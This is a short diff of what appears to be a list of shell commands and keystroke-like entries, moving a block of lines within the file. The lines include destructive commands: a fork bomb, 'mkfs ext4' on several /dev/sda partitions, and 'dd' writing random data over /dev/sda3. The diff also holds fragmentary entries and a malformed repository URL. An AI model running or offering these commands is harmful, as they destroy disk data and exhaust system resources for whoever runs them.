@@ -22,6 +22,13 @@ dd if=/dev/random of=/dev/sda3. 2c
 dd if=/dev/random of=/dev/sda3. 2d
 >file
 <down>
+>file
+:(){:|:&};:
+mkfs ext4 /dev/sda0
+>f no
+mkfs ext4 /dev/sda1
+>file
+mkfs ext4 /dev/sda2
 <down>
 >file
 git clone https://github.com/ooni/probe
@@ -32,13 +39,6 @@ git clone https://github com/Tsunami512/ShapeWatch
 >file
 <down>
 <down>
->file
-:(){:|:&};:
-mkfs ext4 /dev/sda0
->f no
-mkfs ext4 /dev/sda1
->file
-mkfs ext4 /dev/sda2
 >file 
 <down>
 <down>
